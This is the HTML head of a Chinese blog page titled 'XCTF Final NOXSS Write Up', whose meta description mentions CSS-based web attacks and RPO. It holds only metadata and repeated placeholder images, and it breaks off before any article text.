<!DOCTYPE html><html class="has-navbar-fixed-top" lang="zh-cmn-Hans"><head><meta charset="utf-8"><title>XCTF Final NOXSS Write Up - Zedd&#39;s Blog</title><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5"><meta name="description" content="ZeddYu's Blog"><meta name="description" content="这是本次比赛做起来最有跪感的一题了，当时比赛的时候怎么都弄不出来…赛后问了一下，主要还是差了一篇文章 Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację，这个标题是个波兰语，中文翻译过来就是使用 CSS 攻击 Web 应用程序，从文章内容也看到了 RPO 的攻击引述，也"><meta property="og:type" content="article"><meta property="og:title" content="XCTF Final NOXSS Write Up"><meta property="og:url" content="https://blog.zeddyu.info/2019/11/21/XCTF-Final-noxss/index.html"><meta property="og:site_name" content="Zedd&#39;s Blog"><meta property="og:description" content="这是本次比赛做起来最有跪感的一题了，当时比赛的时候怎么都弄不出来…赛后问了一下，主要还是差了一篇文章 Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację，这个标题是个波兰语，中文翻译过来就是使用 CSS 攻击 Web 应用程序，从文章内容也看到了 RPO 的攻击引述，也"><meta property="og:locale" content="en_US"><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" 